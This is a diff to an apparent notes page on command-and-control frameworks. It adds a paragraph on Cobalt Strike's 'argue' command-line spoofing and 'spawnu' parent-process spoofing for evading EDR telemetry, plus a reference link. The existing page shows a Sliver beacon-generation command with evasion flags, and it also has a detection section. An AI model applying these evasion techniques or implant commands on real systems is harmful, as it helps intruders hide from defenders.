@@ -33,6 +33,8 @@ Universal tradecraft regardless of framework:
 sliver > generate beacon --mtls c2.redirector.example:443 --os windows --arch amd64 --evasion --skip-symbols --save ./out
 ```
 
+Process-context tradecraft is just as important as protocol choice. Cobalt Strike's `argue` command spoofs a process command line in PEB memory before `run`, so an EDR that logs `CreateProcess` events sees the cover argument while the real argument string still drives the child — useful for hiding LOLBin flags from command-line telemetry. Pair this with `spawnu <ppid> <listener>` to give the spawned beacon a parent that fits the host's normal process tree (services.exe, explorer.exe under the right session) rather than the loud orphaned `rundll32` parented to your initial-access process.
+
 ## Detection and defence
 - JARM/JA3 fingerprinting on the TLS handshake — default framework certs and cipher orders are catalogued
 - Beacon analysis: periodic + jittered POSTs of consistent size are easy to flag
@@ -45,4 +47,5 @@ sliver > generate beacon --mtls c2.redirector.example:443 --os windows --arch am
 - [Sliver wiki](https://sliver.sh/docs) — feature matrix and transports
 - [Mythic docs](https://docs.mythic-c2.net/) — agent and C2 profile model
 - [Havoc framework](https://github.com/HavocFramework/Havoc) — code and demon features
+- [ired.team — Cobalt Strike 101](https://www.ired.team/offensive-security/red-team-infrastructure/cobalt-strike-101-installation-and-interesting-commands) — beacon commands including argue, spawnu, psinject, browserpivot
 - [[c2-protocol-design]] [[infrastructure-design]]
